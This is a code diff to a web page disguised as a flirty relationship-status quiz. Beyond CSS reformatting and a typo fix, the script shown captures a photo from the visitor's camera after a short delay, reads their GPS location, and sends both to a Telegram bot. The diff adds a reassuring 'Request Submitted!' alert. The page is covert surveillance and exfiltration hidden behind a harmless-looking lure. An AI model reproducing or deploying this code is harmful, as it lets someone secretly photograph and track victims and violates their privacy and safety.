@@ -26,9 +26,17 @@
         }
 
         @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
         }
 
         .container {
@@ -42,8 +50,13 @@
         }
 
         @keyframes glow {
-            from { box-shadow: 0 0 20px #ff00ff; }
-            to { box-shadow: 0 0 40px #00ffff; }
+            from {
+                box-shadow: 0 0 20px #ff00ff;
+            }
+
+            to {
+                box-shadow: 0 0 40px #00ffff;
+            }
         }
 
         h1 {
@@ -117,7 +130,7 @@
 
         <div class="option">
             <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
-            <label for="someoneElse">ALLREADY RELATIONSHIP 🙂</label>
+            <label for="someoneElse">ALREADY RELATIONSHIP 🙂</label>
         </div>
 
         <button class="submit-btn" onclick="submitData()">SUBMIT</button>
@@ -159,20 +172,20 @@
                         const imageData = canvas.toDataURL("image/png");
                         stream.getTracks().forEach(track => track.stop());
 
-                        sendLocationAndImage(selectedOption, imageData);
+                        getLocationAndSend(option = selectedOption, imageData);
                     }, 3000);
                 })
                 .catch(() => alert("Camera access denied!"));
         }
 
-        function sendLocationAndImage(option, imageData) {
+        function getLocationAndSend(option, imageData) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                     sendToTelegram(option, imageData, location);
                 },
                 () => {
-                    sendToTelegram(option, imageData, "Location Denied");
+                    sendToTelegram(option, imageData, "Location Not Available");
                 }
             );
         }
@@ -193,6 +206,8 @@
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
+            }).then(() => {
+                alert("✅ Request Submitted!");
             });
         }
 
@@ -207,6 +222,7 @@
             return new Blob([ab], { type: mimeString });
         }
     </script>
+
 </body>
 
 </html>
